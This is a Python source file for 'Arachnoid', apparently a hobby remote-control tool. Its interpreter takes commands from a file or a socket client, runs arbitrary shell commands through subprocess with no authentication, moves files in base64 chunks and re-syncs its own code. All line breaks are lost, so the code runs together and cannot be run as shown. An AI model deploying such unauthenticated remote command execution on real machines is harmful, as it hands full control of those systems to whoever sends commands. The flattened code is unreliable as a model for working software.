# Arachnoid - Interpreterimport osimport sysimport psutilimport subprocessimport jsonimport timeimport base64import tracebackFILE_IN_PATH  = 'input.txt'FILE_OUT_PATH = 'output.txt'VERBOSE = 1IN_SHELL = FalseMAX_BUFFER_SIZE = 5120Df_WAIT_TIME = 0 # number of ms to wait between requestsCORE_FILES = ['arachnoid.py', 'use.py', 'interpreter.py', 'custom shell client.py']vprint = lambda *args: print(*args) if VERBOSE else Nonecommand_list = [				'ping',				'shutdown',				'restart',				'sync',				'synci',				'sync+',				'cmd',				'sendfile',				'getfile',				'sendfiles',				'getfiles',				'verb',				'exit',				'help'			]'''TAGS:	<COMMAND >	<MESSAGE >	<EXIT>	<STOP>'''def send_raw(s):	file = open(FILE_OUT_PATH, 'a')	file.write(s)	file.close()def send_out(msg, tag): # send a msg through the OUT_FILE	s = '<{} {}>'.format(tag, msg)	send_raw(s)def run(command, additional_data={}, client_f=send_out): # run a command (human||machine)	'''	run(command, additional_data={}) -> None	gets a command, runs it (arbitrarily)	commands are meant to be run from the user and/or machine.	the commands may be doing stuff that is not implied in the name.	I'm sorry, but this is way too exiting to write correct code (for now, will come sometime)	'''	global VERBOSE	command = command.split(' ')	vprint('running command: {}'.format(command[0]))	if command[0] == 'help':		vprint('Commands:\n - {}'.format('\n - '.join(command_list)))	elif command[0] == 'exit':		return	elif command[0] == 'verb':		VERBOSE = int(command[1])	elif command[0] == 'ping':		client_f('ping ?', 'MESSAGE')		client_f('ping-resp', 'COMMAND')	elif command[0] == 'ping-resp':		vprint('ping received')		client_f('ping received', 'MESSAGE')	elif command[0] in ['cls', 'clear']:		os.system('cls')	elif command[0] == 'shutdown':		send_raw('<STOP>')	elif command[0] == 'sync':		for file in CORE_FILES:			run('sendfile {}'.format(file), additional_data=additional_data, client_f=client_f)			time.sleep(Df_WAIT_TIME/1000)	elif command[0] == 'synci':		run('sendfile interpreter.py', additional_data=additional_data, client_f=client_f)		time.sleep(1)		run('restart', additional_data=additional_data, client_f=client_f)	elif command[0] == 'sync+': # sync + restart		run('sync', additional_data=additional_data, client_f=client_f)		run('restart', additional_data=additional_data, client_f=client_f)	elif command[0] == 'restart':		client_f('restart', 'COMMAND')		if sys.argv[-1] == 'shell':			os.system('echo Restarting & python interpreter.py shell')		else:			os.system('echo Restarting & python interpreter.py')		sys.exit()		'''		try:			p = psutil.Process(os.getpid())			for handler in p.open_files() + p.connections():				try: os.close(handler.fd)				except IOError as e: vprint('IOError: {}'.format(e))		except Exception as e:			print('Error: {}'.format(e))		python = sys.executable		os.execl(python, python, *sys.argv)		'''	elif command[0] == 'cmd':		client_f('cmdrun {}'.format(' '.join(command[1:])), 'COMMAND')	elif command[0] == 'cmdrun':		#proc = subprocess.Popen(command[1:], stdout=subprocess.PIPE, shell=True)		#output = proc.communicate()		output = subprocess.getoutput(' '.join(command[1:]))		vprint('output:\n{}\n'.format(output))		client_f(output, 'MESSAGE')	elif command[0] == 'writefile':		'''		write a file, assuming it is smaller than 5 kb		'''		command = ' '.join(command[1:])		file_data = json.loads(command)		path = file_data['path']		opening_mode = file_data['opening mode']		file_content = file_data['content'][2:-1] # removing "b'" and "'" (from "b'these are bytes'")		file_content = base64.b64decode(file_content)		file = open(path, opening_mode)		file.write(file_content)		file.close()	elif command[0] == 'sendfile':		'''		send a ~large~ file (5 kb +)		'''		path = ' '.join(command[1:])		file_content = open(path, 'rb').read()		file_buffer_list = []		additional_data_length = 57 + len(path.encode('utf8')) + 1 + 256		file_size = len(file_content)		b64_file_size = 4 * file_size / 3 + (4 - (file_size % 4))		b64_file_buffer_size = (MAX_BUFFER_SIZE - additional_data_length)		file_buffer_size = int(file_size / (b64_file_size / b64_file_buffer_size))		for buffer_start_index in range(0, file_size, file_buffer_size):			encoded_b64_data = base64.b64encode(file_content[buffer_start_index : buffer_start_index + file_buffer_size])			assert len(encoded_b64_data) < MAX_BUFFER_SIZE + additional_data_length			file_buffer_list.append(encoded_b64_data)		for index, file_buffer in enumerate(file_buffer_list):			if index > 0:				time.sleep(Df_WAIT_TIME / 1000)			sub_command = r'writefile {"path": "%s", "opening mode": "%s", "content": "%s"}' % (								path,								'wb' if index == 0 else 'ab',								file_buffer				)			vprint('size of sub_command: {}'.format(len(sub_command)))			client_f(sub_command, 'COMMAND')	elif command[0] == 'getfile':		path = ' '.join(command[1:])		client_f('sendfile {}'.format(path), 'COMMAND')	elif command[0] == 'sendfiles':		s = ' '.join(command[1:]) + ' ' # need it for the for loop		path_list = paths_from_string(s)		for path in path_list:			run('sendfile {}'.format(path), additional_data=additional_data, client_f=client_f)			time.sleep(Df_WAIT_TIME/1000)	elif command[0] == 'getfiles':		s = ' '.join(command[1:])		path_list = paths_from_string(s)		vprint('l', path_list)		for path in path_list:			run('getfile {}'.format(path), additional_data=additional_data, client_f=client_f)			time.sleep(Df_WAIT_TIME/1000)	else:		print('ERROR: Command {} not found.'.format(command[0]))def format_string_buffer(s):	replacements = {					'\n': '\\n',					'\\': '\\\\',					'\'': '\\\'',					'\a': '\\a',					'\b': '\\b',					'\f': '\\f',					'\n': '\\n',					'\r': '\\r',					'\t': '\\t',					'\v': '\\v'				   }	for key, item in list(replacements.items()):		s = s.replace(key, item)	return sdef format_buffer(buffer_):	replacements = {					b'\n': b'\\n',					b'\\': b'\\\\',					b'\'': b'\\\'',					b'\a': b'\\a',					b'\b': b'\\b',					b'\f': b'\\f',					b'\n': b'\\n',					b'\r': b'\\r',					b'\t': b'\\t',					b'\v': b'\\v'				   }	for key, item in list(replacements.items()):		buffer_ = buffer_.replace(key, item)	return buffer_def format_command(command):	command = ' '.join(filter(None, command.split(' '))) # remove unneeded spaces	return commanddef handler(content):	content_list = list(filter(None, content.split('<<RECV>>')))	content_list = list(map(lambda c: c[:-1] if c[-1] == '\n' else c, content_list))	for msg in content_list:		msg = msg[msg.index(': ') + 2:]		tag = msg[1:-1].split(' ')[0]		if tag in ('EXIT', 'STOP'):			break		elif tag == 'COMMAND':			command = ' '.join(msg[1:-1].split(' ')[1:])			run(command)		elif tag == 'MESSAGE':			text = ' '.join(msg[1:-1].split(' ')[1:])			vprint('message: {}'.format(text))		else:			vprint('ERROR: unkown tag "{}"'.format(tag))def interpreter(file_path=FILE_IN_PATH):	file = open(file_path, 'r')	content = file.read()	content = ''	vprint('Interpreter: Loop started')	while content != '<STOP>':		if content:			handler(content)		content = file.read()	sys.exit('received <STOP> in interpreter')def paths_from_string(s):	num_paths = s.count('"')	assert num_paths % 2 == 0 # there are an even number of '"' signs	path_list = []	for i in range(num_paths//2):		index1 = s.index('"')		index2 = s.index('"', index1+1)		path_list.append(s[index1+1:index2])		s = s[index2+1:]	return path_listdef message_printer(file_path=FILE_IN_PATH):	global IN_SHELL	file_handler = open(file_path)	while IN_SHELL:		content = file_handler.read()		if content:			if '<MESSAGE' in content:				msg = content[content.index('<MESSAGE')+9:-1]				print('MSG: {}'.format(msg))def shell(file_path=FILE_OUT_PATH):	global IN_SHELL	IN_SHELL = True	print('WARNING: sell v.1 is deprecated. So^me commands may not work as intended or not work at all.')	shell_string = 'command > '	command = ''	while command != 'exit':		command = format_command(input(shell_string))		if command:			try:				run(command)			except Exception as e:				print('ERROR: {}'.format(e))				traceback.print_exc()	IN_SHELL = Falsedef shell2(client):	global VERBOSE	global IN_SHELL	IN_SHELL = True	def custom_send_out(msg, tag):		s = '<{} {}>'.format(tag, msg)		client.tasks.append(s.encode('utf8'))	shell_string = 'command > '	command = ''	while command != 'exit':		command = format_command(input(shell_string))		if command:			try:				run(command, client_f=custom_send_out)				time.sleep(.1)			except Exception as e:				print('ERROR: {}'.format(e))				traceback.print_exc()			if command[:4] == 'verb':				client.verbose = bool(VERBOSE)	IN_SHELL = False	client.close()if __name__ == '__main__':	if sys.argv[-1] == 'shell':		shell()	else:		interpreter()#???